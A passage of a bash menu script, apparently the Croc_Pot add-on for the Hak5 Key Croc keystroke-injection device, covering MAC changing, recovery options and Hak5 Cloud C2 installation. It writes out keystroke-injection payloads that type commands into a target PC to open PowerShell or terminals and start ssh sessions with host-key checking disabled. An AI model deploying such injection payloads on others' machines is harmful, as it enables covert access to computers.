Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -m ${r_a} wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk {'print \\\$2'} | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[sS])
		echo -ne "#!/bin/bash
Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -m ${original_mac} wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk {'print \\\$2'} | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[nN])
		croc_recovery ;;
	*)
		invalid_entry ; mac_changer ;;
	esac
}
##
#----Recovery main menu
##
MenuTitle KEYCROC RECOVERY MENU ; MenuColor 27 1 DOWNLOAD LATEST FIRMWARE ; MenuColor 27 2 KEYCROC DOCS.HAK5 WEBSITE ; MenuColor 27 3 REPAIR en_US.UTF-8 ERROR ; MenuColor 27 4 KEYCROC UPDATE PACKAGES
MenuColor 27 5 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 6 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 7 CHANGE KEYCROC TIMEZONE ; MenuColor 27 8 CHANGE KEYCROC PASSWORD ; MenuColor 27 9 MAC ADDRESS CHANGER ; MenuColor 26 10 RETURN TO MAIN MENU ; MenuEnd 30
	case $m_a in
	1) croc_firmware ; croc_recovery ;; 2) start_web https://docs.hak5.org/key-croc/ ; croc_recovery ;; 3) locale_en_US ; croc_recovery ;; 4) croc_update ; croc_recovery ;;
	5) remove_croc_pot ;; 6) reboot_shutdown ; croc_recovery ;; 7) croc_clock ; croc_recovery ;; 8) passwd ; croc_recovery ;;
	9) mac_changer ;; 10) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; croc_recovery ;;
	esac
}
##
#----Hak5 Cloud_C2 menu/function
##
function hak_cloud() {
	clear
	if [ -e /var/hak5c2 ]; then
		echo -ne "${yellow}HAK5 Cloud C2 is installed\nVER: ${clear}${green}`ls /usr/local/bin | grep c2-`${clear}\n"
		systemctl status hak5.service
	else
		echo -ne "\n$(ColorYellow 'HAK5 Cloud C2 is not installed')\n"
	fi
	echo -ne "$(Info_Screen '
-Run HAK5 Cloud C2 on the keycroc
-When running setup, maximize the screen to read Token keys properly
-To get Token keys Run #3 RELOAD HAK5 C2 until the keys show up
-May need to Unplug the keycroc plug back in and try again
-This will check to see if unzip is installed if not install it
-This will not start C2 on boot Next reboot run #4 RESTART HAK5 C2
-ON any device type in the keycroc IP into any web browser url,
-Device must be on same network as the keycroc and then to connect HAK5 C2')\n"
##
#----Hak5 Cloud_C2 install unzip
##
cloud_setup() {
	read_all DOWNLOAD AND INSTALL CLOUD C2 AND UNZIP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	install_package unzip UNZIP cloud_setup hak_cloud
##
#----Hak5 Cloud_C2 download and install
##
if [ -e /var/hak5c2 ]; then
	echo -ne "\t${LINE_}$(ColorYellow 'HAK5 C2 is already installed on the keycroc')${LINE_}\n"
	hak_cloud
else
	echo -ne "\n\t${LINE_}$(ColorGreen 'Installing HAK5 C2 on the keycroc')${LINE_}\n"
	sleep 3
	wget https://c2.hak5.org/download/community -O /tmp/community && unzip /tmp/community -d /tmp
	sleep 5
	mv /tmp/c2-3.2.0_armv7_linux /usr/local/bin && mkdir /var/hak5c2
	echo -ne "[Unit]\nDescription=Hak5 C2\nAfter=hak5.service\n[Service]\nType=idle
ExecStart=/usr/local/bin/c2-3.2.0_armv7_linux -hostname $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) -listenport 80 -db /var/hak5c2/c2.db
[Install]\nWantedBy=multi-user.target" >> /etc/systemd/system/hak5.service
	sleep 1
	systemctl daemon-reload && systemctl start hak5.service
	sleep 5
	systemctl status hak5.service
	sleep 5
	echo -ne "\t${LINE_}$(ColorGreen 'HAK-5 Cloud C2 Installed, Starting C2 web UI')${LINE_}"
	sleep 5
	cloud_web
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; cloud_setup ;;
esac
}
##
#----Hak5 Cloud_C2 start web brower
##
cloud_web() {
	start_web http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
}
##
#----Hak5 Cloud_C2 reload
##
reload_cloud() {
	systemctl daemon-reload && systemctl start hak5.service
	sleep 5
	systemctl status hak5.service
	sleep 5
}
##
#----Hak5 Cloud_C2 remove C2
##
remove_cloud() {
	rm -r /var/hak5c2
	rm /usr/local/bin/c2-3.2.0_armv7_linux
	rm /etc/systemd/system/hak5.service
}
##
#----Quick start Cloud_C2 (payload)
##
quick_cloud() {
	clear
	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
	echo -ne "$(Info_Screen '
-Will need to install Cloud C2 first on the keycroc
-This will install Quick_Start_C2.txt in the payload folder
-Use this to start C2 from a payload
-Type in startc2 this will automatically start Hak5 cloud C2')\n"
if [ -e "${quickcloud}" ]; then
	echo -ne "\n$(ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n')"
else
	read_all INSTALL QUICK START CLOUD C2 PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "MATCH startc2\nCROC_OS=/root/udisk/loot/Croc_OS.txt\nif [ -e \${CROC_OS} ]; then\nLED G\nsystemctl restart hak5.service
sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\nQ GUI d\nQ GUI r\nsleep 1\nQ STRING \"powershell\"
Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
raspberrypi)\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\n$HOST_CHECK)\nQ ALT F2\nsleep 1\nQ STRING \"mate-terminal\"\nQ ENTER\nsleep 1
Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemctl restart hak5.service\nsleep 5\nfi" >> ${quickcloud}
	echo -ne "\n$(ColorGreen 'Quick_Start_C2.txt is now installed check payloads folder\n')" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; quick_cloud ;;
	esac
fi
}
##
#----Save Cloud_C2 setup/ip function
##
save_ip() {
	clear
	echo -ne "$(Info_Screen '
- #1 will save the IP,Netmask,Gateway that is setup with C2
- #2 will restore the keycroc to saved IP,Netmask,Gateway
- #3 Manually add IP,Netmask,Gateway')\n"
save_setup() {
	local cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
run_save_v() {
	ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6- | tee ${cloud_ip}
	/sbin/ifconfig wlan0 | awk '/Mask:/ {print $4;}' | sed -e 's/Mask://g' -e 's/^[\t]*//' | tee -a ${cloud_ip}
	ip r | grep default | sed -e 's/default//g' -e 's/via//g' -e 's/dev//g' -e 's/wlan0//g' -e 's/^[[:space:]]*//g' | tee -a ${cloud_ip}
}
if [ -e "${cloud_ip}" ]; then
	echo -ne "\n$(ColorGreen 'C2_IP.txt file already exists')\n"
	read_all REMOVE EXISTING AND SAVE NEW SETUP Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n$(ColorRed 'REMOVING EXISTING SETUP AND SAVING NEW')\n"
		rm ${cloud_ip}
		run_save_v ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
	*)
		invalid_entry ; save_ip ;;
	esac
else
	echo -ne "\n$(ColorYellow 'SAVING SETUP IP TO TOOLS/CROC_POT')\n"
	run_save_v
fi
}
##
#----Hak5 Cloud_C2 restore ip to first setup
#----restore ip just for this session
##
restore_ip() {
	clear
	echo -ne "\n$(ColorYellow 'This will restore keycroc IP back to the IP when C2 was first setup')\n"
if [ -e "${cloud_ip}" ]; then
	echo -ne "$(ColorYellow 'Keycroc IP will change to this IP now  ')$(sed -n 1p ${cloud_ip})\n"
	echo -ne "$(ColorYellow 'Will need to start new ssh with this IP')$(sed -n 1p ${cloud_ip})\n"
	read_all CHANGE KEYCROC IP Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		ifconfig wlan0 $(sed -n 1p ${cloud_ip}) netmask $(sed -n 2p ${cloud_ip}); route add default gw $(sed -n 3p ${cloud_ip}) wlan0; ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
	*)
		invalid_entry ; save_ip ;;
	esac
else
	echo -ne "\n$(ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP')\n"
	run_save_v
fi
}
##
#----Hak5 Cloud_C2 edit the ip to use for C2
##
edit_ip() {
	clear
	echo -ne "\n$(ColorYellow 'Manually Enter IP,Netmask,Gateway for the keycroc')\n"
	read_all CHANGE KEYCROC IP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER IP TO BE USED AND PRESS [ENTER] ; ip_e=${r_a}
	read_all ENTER NETMASK TO BE USED AND PRESS [ENTER] ; mask_e=${r_a}
	read_all ENTER GATEWAY TO BE USED AND PRESS [ENTER] ; gate_e=${r_a}
	ifconfig wlan0 ${ip_e} netmask ${mask_e}; route add default gw ${gate_e} wlan0; ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
*)
	invalid_entry ; save_ip ;;
esac
}
##
#----Hak5 C2 ip restore Menu
##
MenuTitle SAVE C2 SETUP IP MENU ; MenuColor 19 1 SAVE C2 SETUP IP ; MenuColor 19 2 RESTORE C2 SETUP IP ; MenuColor 19 3 EDIT CROC IP ; MenuColor 19 4 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) save_setup ; save_ip ;; 2) restore_ip ; save_ip ;; 3) edit_ip ; save_ip ;; 4) main_menu ;; 0) exit 0 ;; [bB]) hak_cloud ;; [pP]) Panic_button ;; *) invalid_entry ; save_ip ;;
	esac
}
##
#----Hak5 Cloud_C2 menu
##
MenuTitle HAK5 CLOUD C2 MENU ; MenuColor 20 1 HAK5 C2 SETUP ; MenuColor 20 2 START HAK5 C2 ; MenuColor 20 3 RELOAD HAK5 C2 ; MenuColor 20 4 RESTART HAK5 C2 ; MenuColor 20 5 STOP HAK5 C2
MenuColor 20 6 REMOVE HAK5 C2 ; MenuColor 20 7 EDIT HAK5 C2 ; MenuColor 20 8 QUICK START C2 ; MenuColor 20 9 SAVE C2 SETUP IP ; MenuColor 19 10 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) cloud_setup ; hak_cloud ;; 2) cloud_web ; hak_cloud ;; 3) reload_cloud ; hak_cloud ;; 4) systemctl restart hak5.service ; cloud_web ; hak_cloud ;; 5) systemctl stop hak5.service ; hak_cloud ;;
	6) remove_cloud ; hak_cloud ;; 7) nano /etc/systemd/system/hak5.service ; hak_cloud ;; 8) quick_cloud ; hak_cloud ;; 9) save_ip ; hak_cloud ;; 10) main_menu ;; [bB]) main_menu ;; 0) exit 0 ;; [pP]) Panic_button ;; *) invalid_entry ; hak_cloud ;;
	esac
}
##
#----Croc_Pot Main Menu
##
function main_menu() {
	clear
croc_title ; sleep 2 ; tput cup 8 0 ; MenuTitle CROC_POT MAIN MENU ; MenuColor 16 1 CROC MAIL | tr -d '\n' ; echo -ne "${blue}${array[4]} ${clear}\n" ; MenuColor 16 2 CROC POT PLUS | tr -d '\n' ; echo -ne "${red}${array[5]} ${clear}\n"
MenuColor 16 3 KEYCROC STATUS | tr -d '\n' ; echo -ne "${green}${array[6]} ${clear}\n" ; MenuColor 16 4 KEYCROC LOGS | tr -d '\n' ; echo -ne "${white}${array[7]} ${clear}\n" ; MenuColor 16 5 KEYCROC EDIT | tr -d '\n' ; echo -ne "${yellow}${array[8]} ${clear}\n"
MenuColor 16 6 SSH MENU | tr -d '\n' ; echo -ne "${cyan}${array[9]} ${clear}\n" ; MenuColor 16 7 RECOVERY MENU | tr -d '\n' ; echo -ne "${pink}${array[10]} ${clear}\n" ; MenuColor 16 8 HAK5 CLOUD C2 | tr -d '\n' ; echo -ne "${white}${array[11]} ${clear}\n" ; MenuEnd 20
	case $m_a in
	1) croc_mail ;; 2) croc_pot_plus ;; 3) croc_status ;; 4) croc_logs_mean ;; 5) croc_edit_menu ;; 6) ssh_menu ;; 7) croc_recovery ;; 8) hak_cloud ;; 0) exit 0 ;; [pP]) Panic_button ;; kp | KP) start_ping ; main_menu ;; *) invalid_entry ; main_menu ;;
	esac
}
main_menu
exit
